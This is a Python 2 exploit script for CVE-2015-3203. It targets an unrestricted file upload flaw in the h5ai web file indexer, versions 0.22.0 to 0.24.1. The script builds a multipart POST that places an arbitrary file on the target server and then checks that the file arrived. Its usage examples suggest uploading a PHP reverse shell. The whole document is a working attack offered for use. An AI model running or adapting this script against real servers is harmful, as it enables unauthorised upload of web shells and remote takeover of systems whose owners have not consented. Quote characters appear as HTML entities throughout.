 
# Exploit Title: h5ai < 0.25.0 Unrestricted File Upload
# Date: 21 September 2015
# Exploit Author: rTheory
# Vendor Homepage: https://larsjung.de/h5ai/
# Vulnerable Software Link: https://web.archive.org/web/20140208063613/http://release.larsjung.de/h5ai/h5ai-0.24.0.zip
# Vulnerable Versions: 0.22.0 - 0.24.1
# Tested on: 0.24.0 running on Apache
# CVE : 2015-3203
 
import urllib
import urllib2
import socket
import os
import getopt
import sys
 
# Globals with default options
url = &#039;&#039;
path = &#039;/&#039;
fileName = &#039;&#039;
filePath = &#039;&#039;
verboseMode = False
 
def header():
    print &#039;+-----------------------------------------------+&#039;
    print &#039;| File upload exploit for h5ai v0.22.0 - 0.24.1 |&#039;
    print &#039;|  See CVE-2015-3203 for vulnerability details  |&#039;
    print &#039;+------------------- rTheory -------------------+&#039;
 
def usage():
    print
    print &#039;Usage: %s -t target_url -f upload_file&#039; % os.path.basename(__file__)
    print &#039;-t --target           - The URL to connect to&#039;
    print &#039;                        ex: http://example.com&#039;
    print &#039;-f --file             - The file to upload&#039;
    print &#039;                        ex: php-reverse-shell.php&#039;
    print &#039;-p --path             - The path to upload to&#039;
    print &#039;                        Default is \&#039;/\&#039;&#039;
    print &#039;-v --verbose          - Enable more verbose output&#039;
    print
    print &#039;Examples:&#039;
    print &#039;%s -t http://example.com:8080 -f php-reverse-shell.php&#039; % os.path.basename(__file__)
    print &#039;%s -t http://192.168.1.100 -f php-reverse-shell.php -p /dir/&#039; % os.path.basename(__file__)
    sys.exit(0)
     
def main():
    global url
    global path
    global fileName
    global filePath
    global verboseMode
     
    header()
     
    if not len(sys.argv[4:]):
        print &#039;[-] Incorrect number of arguments&#039;
        usage()
         
    try:
        opts, args = getopt.getopt(sys.argv[1:],"ht:f:p:v", ["help","target","file","path","verbose"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
 
    for o,a in opts:
        if o in (&#039;-h&#039;,&#039;--help&#039;):
            usage()
        elif o in (&#039;-t&#039;,&#039;--target&#039;):
            url = a
        elif o in (&#039;-f&#039;,&#039;--file&#039;):
            fileName = a
        elif o in (&#039;-p&#039;,&#039;--path&#039;):
            path = a
        elif o in (&#039;-v&#039;,&#039;--verbose&#039;):
            verboseMode = True
        else:
            assert False,"Unhandled Option"
         
    # Test target URL, target file, and path inputs for validity
    if not url.startswith(&#039;http&#039;):
        print &#039;[-] Error: Target URL must start with http:// or https://&#039;
        usage()
    if not os.path.isfile(fileName):
        print &#039;[-] Error: File does not appear to exist&#039;
        usage()
    if not (path.startswith(&#039;/&#039;) and path.endswith(&#039;/&#039;)):
        print &#039;[-] Error: Path must start and end with a \&#039;/\&#039;&#039;
        usage()
     
    # Determine target host, which is the URL minus the leading protocol
    if url.find(&#039;http://&#039;) != -1:
        host = url[7:]
    elif url.find(&#039;https://&#039;) != -1:
        host = url[8:]
    else:
        host = url
     
    # Store the contents of the upload file into a string
    print &#039;[+] Reading upload file&#039;
    f = open(fileName,&#039;r&#039;)
    fileContents = f.read()
    f.close()
     
    MPFB = &#039;multipartformboundary1442784669030&#039; # constant string used for MIME info
 
    # Header information. Content-Length not needed.
    http_header = {
        "Host" : host,
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "en-us,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Content-type" : "multipart/form-data; boundary=------" + MPFB,
        "X-Requested-With" : "XMLHttpRequest",
        "Referer" : url + path, 
        "Connection" : "keep-alive"
    }
 
    # POST parameter for file upload
    payload  = &#039;--------&#039;+MPFB+&#039;\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload\r\n&#039;
    payload += &#039;--------&#039;+MPFB+&#039;\r\nContent-Disposition: form-data; name="href"\r\n\r\n&#039;+path+&#039;\r\n&#039;
    payload += &#039;--------&#039;+MPFB+&#039;\r\nContent-Disposition: form-data; name="userfile"; filename="&#039;+fileName+&#039;"\r\nContent-Type: \r\n\r\n&#039;+fileContents+&#039;\r\n&#039;
    payload += &#039;--------&#039;+MPFB+&#039;--\r\n&#039;
 
    socket.setdefaulttimeout(5)
    opener = urllib2.build_opener()
    req = urllib2.Request(url, payload, http_header)
 
    # submit request and print output. Expected: "code 0"
    try:
        print &#039;[+] Sending exploit POST request&#039;
        res = opener.open(req)
        html = res.read()
        if verboseMode: print &#039;[+] Server returned: &#039; + html
    except:
        print &#039;[-] Socket timed out, but it might still have worked...&#039;
 
    # close the connection
    opener.close()
 
    # Last step: check to see if the file uploaded (performed outside of this function)
    filePath = url + path + fileName
    print &#039;[+] Checking to see if the file uploaded:&#039;
    print &#039;[+] &#039; + filePath 
 
def postCheck():
    # Check to see if the file exists
    # This may work now that everything from main() was torn down
    global filePath
    try:
        urllib2.urlopen(filePath)
        print &#039;[+] File uploaded successfully!&#039;
    except urllib2.HTTPError, e:
        print &#039;[-] File did not appear to upload&#039;
    except urllib2.URLError, e:
        print &#039;[-] File did not appear to upload&#039;
     
main()
postCheck()

